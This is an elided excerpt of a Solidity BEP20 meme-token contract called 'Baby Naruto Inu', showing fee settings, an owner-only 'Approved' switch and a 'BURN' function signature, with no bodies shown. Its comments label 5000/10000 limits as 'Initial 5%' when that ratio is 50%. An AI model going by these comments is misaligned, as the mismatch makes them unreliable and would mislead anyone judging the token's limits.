...
/**
 * Contract Code Immortal
 */

contract BabyNarutoInu is Context, IBEP20, Ownable {
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Baby Naruto Inu";
    string constant _symbol = "BNI"; 
    ...
    uint256 public _maxTxAmount = _tTotal * 5000 / 10000; //Initial 5%
    uint256 public _maxWalletSize = _tTotal * 5000 / 10000; //Initial 5%

    // Fees Receivers
    address public devFeeReceiver = 0xf7195Ff9D87F9ba49177E779D81602B8cEcC2ccd;
    address public marketingFeeReceiver = 0xf7195Ff9D87F9ba49177E779D81602B8cEcC2ccd;
    address public liquidityFeeReceiver = 0xf7195Ff9D87F9ba49177E779D81602B8cEcC2ccd;
    ...
    function Approved(address account, bool status) public onlyOwner {
    ...
    function BURN(address tokenAddress, uint256 tokens) public returns (bool success) {
